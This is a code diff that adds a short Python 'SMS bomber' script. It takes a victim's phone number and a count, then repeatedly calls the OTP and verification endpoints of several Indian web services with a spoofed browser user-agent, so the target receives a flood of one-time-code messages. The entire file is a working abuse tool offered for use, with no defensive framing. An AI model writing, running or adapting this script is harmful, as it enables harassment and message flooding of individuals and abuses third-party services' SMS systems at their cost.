@@ -1,0 +1,27 @@
+import requests
+
+headers = {
+    'pragma': 'no-cache',
+    'cache-control': 'no-cache',
+    'dnt': '1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (X11; CrOS x86_64 8172.45.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.64 Safari/537.36'
+}
+number = int(input("Enter the Phone Number(without country code): "))
+sms = int(input("How many SMS: "))
+while(sms!=0):
+  data = [{"phone": number},{"phone": number},{"contactNumber":number}, {"contactNo": number}]
+
+  post_urls = ["https://login.housing.com/api/v2/send-otp", "https://unacademy.com/api/v1/user/get_app_link/",
+  "https://pharmeasy.in/api/auth/requestOTP",
+  "https://www.mylescars.com/usermanagements/chkContact"]
+
+  get_urls = [f"https://t.justdial.com/api/india_api_write/18july2018/sendvcode.php?mobile={number}"]
+
+  for url in range(len(post_urls)):
+    requests.post(post_urls[url] , data=data[url])
+
+  for url in range(len(get_urls)):
+    r = requests.get(get_urls[url], headers=headers)
+  sms-=1
+print("Task Completed!")
